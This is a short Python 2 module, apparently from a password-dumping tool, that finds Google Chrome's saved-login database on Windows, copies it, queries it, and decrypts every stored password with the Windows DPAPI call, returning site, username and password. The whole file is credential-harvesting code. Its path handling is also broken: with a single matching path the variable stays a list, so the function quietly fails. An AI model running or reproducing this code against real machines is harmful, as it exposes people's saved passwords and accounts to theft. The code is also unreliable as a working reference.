
import shutil
import win32crypt
import sys, os, platform
import getpass
import sqlite3

class Chrome():
	
	def run(self):
		database_path = ''
		homedrive = ''
		homepath = ''
		if 'HOMEDRIVE' in os.environ and 'HOMEPATH' in os.environ:
			homedrive = os.environ.get('HOMEDRIVE')
			homepath = os.environ.get('HOMEPATH')
		
		# All possible path
		pathTab = [
			homedrive + homepath + '\Local Settings\Application Data\Google\Chrome\User Data\Default\Login Data', 
			homedrive + homepath + '\AppData\Local\Google\Chrome\User Data\Default\Login Data', 
			homedrive + '\Users\\' + getpass.getuser() + '\Local Settings\Application Data\Google\Chrome\User Data\Default\Login Data',
			homedrive + '\Users\\' + getpass.getuser() + '\AppData\Local\Google\Chrome\User Data\Default\Login Data',
			'C:\Users\\' + getpass.getuser() + '\Local Settings\Application Data\Google\Chrome\User Data\Default\Login Data',
			'C:\Users\\' + getpass.getuser() + '\AppData\Local\Google\Chrome\User Data\Default\Login Data'
		]

		database_path = [p for p in pathTab if os.path.exists(p)]
		if not database_path:
			return

		# if many path are valid
		if len(database_path) !=1:
			database_path = database_path[0]
		
		# Copy database before to query it (bypass lock errors)
		try:
			shutil.copy(database_path, os.getcwd() + os.sep + 'tmp_db')
			database_path = os.getcwd() + os.sep + 'tmp_db'

		except Exception,e:
			pass
			
		# Connect to the Database
		try:
			conn = sqlite3.connect(database_path)
			cursor = conn.cursor()
		except Exception,e:
			return 
		
		# Get the results
		try:
			cursor.execute('SELECT action_url, username_value, password_value FROM logins')
		except:
			return
		
		pwdFound = []
		for result in cursor.fetchall():
			values = {}
			
			try:
				# Decrypt the Password
				password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
			except Exception,e:
				password = ''
				
			if password:
				values["Category"] = "chrome"
				values["Website"] = result[0]
				values["Username"] = result[1]
				values["Password"] = password
				pwdFound.append(values)
		
		conn.close()
		if database_path.endswith('tmp_db'):
			os.remove(database_path)

		return pwdFound
		